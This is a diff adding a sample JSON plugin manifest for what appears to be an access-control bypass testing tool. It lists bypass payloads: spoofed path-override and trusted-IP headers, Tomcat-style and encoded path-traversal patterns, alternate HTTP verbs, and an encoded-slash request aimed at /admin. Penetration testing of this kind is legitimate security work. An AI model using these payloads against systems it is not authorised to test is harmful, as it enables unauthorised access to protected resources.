@@ -1,0 +1,40 @@
+{
+  "name": "example-custom-bypasses",
+  "version": "1.0.0",
+  "description": "Sample declarative plugin. Drop JSON manifests like this into the configured plugin directory (default: plugins/) and enable plugins in config to have their payloads appended to the technique registry.",
+  "headers": [
+    {
+      "name": "X-Original-URL",
+      "value": "{path}",
+      "description": "Origin-path override trusted by some reverse proxies"
+    },
+    {
+      "name": "X-Rewrite-URL",
+      "value": "{path}",
+      "description": "Alternate path override header"
+    },
+    {
+      "name": "X-Custom-IP-Authorization",
+      "value": "127.0.0.1",
+      "description": "Trusted IP header used by some perimeter stacks"
+    }
+  ],
+  "paths": [
+    {
+      "pattern": "{target}/..;/",
+      "description": "Tomcat-style path parameter truncation"
+    },
+    {
+      "pattern": "{target}%2e%2e;/",
+      "description": "Encoded traversal with path parameter"
+    }
+  ],
+  "methods": ["PATCH", "PROPFIND"],
+  "raw": [
+    {
+      "method": "GET",
+      "url": "{target}?%2fadmin",
+      "description": "Encoded slash query variant"
+    }
+  ]
+}
